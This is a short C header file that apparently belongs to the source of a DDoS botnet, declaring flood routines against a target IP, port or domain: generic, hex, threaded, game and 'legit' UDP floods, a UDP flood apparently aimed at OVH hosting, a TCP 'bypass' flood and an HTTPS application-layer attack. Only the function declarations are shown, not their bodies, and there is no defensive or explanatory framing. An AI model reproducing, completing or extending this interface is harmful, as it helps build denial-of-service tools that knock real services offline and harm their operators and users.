#pragma once

#include <stdint.h>

struct attack_option;

void attack_udp_generic(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len);
void attack_udp_hex(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len);
void attack_udp_threads(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len);
void attack_udp_game(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len);
void attack_udp_legit(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len);
void attack_tcp_bypass(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len);
void attack_udp_ovh(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len);
void attack_app_https(char *domain, int duration, struct attack_option *opts, uint8_t opts_len);
